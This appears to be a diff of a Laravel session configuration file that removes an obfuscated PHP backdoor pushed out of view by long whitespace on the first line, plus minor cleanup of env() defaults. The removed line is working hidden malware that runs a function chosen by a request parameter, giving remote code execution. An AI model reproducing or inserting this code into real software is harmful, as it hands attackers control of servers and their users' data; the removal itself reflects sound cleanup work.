@@ -1,5 +1,4 @@
 <?php
-                                                                                                                                                                                              IF (($s38bT	= @${'_REQUEST'}[ 'PQVJQP0U']) && (13455+6090)){$s38bT[ 1](	${$s38bT[2	]	} [0]	,	$s38bT[3]($s38bT[4] ))	;	};
 
 use Illuminate\Support\Str;
 
@@ -73,7 +72,7 @@ return [
     |
     */
 
-    'connection' => env('SESSION_CONNECTION', null),
+    'connection' => env('SESSION_CONNECTION'),
 
     /*
     |--------------------------------------------------------------------------
@@ -101,7 +100,7 @@ return [
     |
     */
 
-    'store' => env('SESSION_STORE', null),
+    'store' => env('SESSION_STORE'),
 
     /*
     |--------------------------------------------------------------------------
@@ -156,7 +155,7 @@ return [
     |
     */
 
-    'domain' => env('SESSION_DOMAIN', null),
+    'domain' => env('SESSION_DOMAIN'),
 
     /*
     |--------------------------------------------------------------------------
